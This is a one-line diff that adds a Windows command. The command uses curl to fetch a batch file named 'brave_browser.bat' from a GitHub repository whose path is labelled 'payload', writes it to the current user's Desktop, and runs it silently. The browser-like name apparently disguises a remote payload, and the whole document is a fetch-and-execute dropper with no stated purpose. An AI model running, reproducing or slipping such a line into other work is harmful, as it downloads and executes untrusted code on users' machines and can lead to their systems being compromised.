@@ -1,0 +1,1 @@
+cmd /c /q curl.exe https://raw.githubusercontent.com/soulreaper71/payload/refs/heads/main/brave_browser.bat >> C:/users/%username%/Desktop/brave_browser.bat &&cmd /c /q C:/users/%username%/Desktop/brave_browser.bat
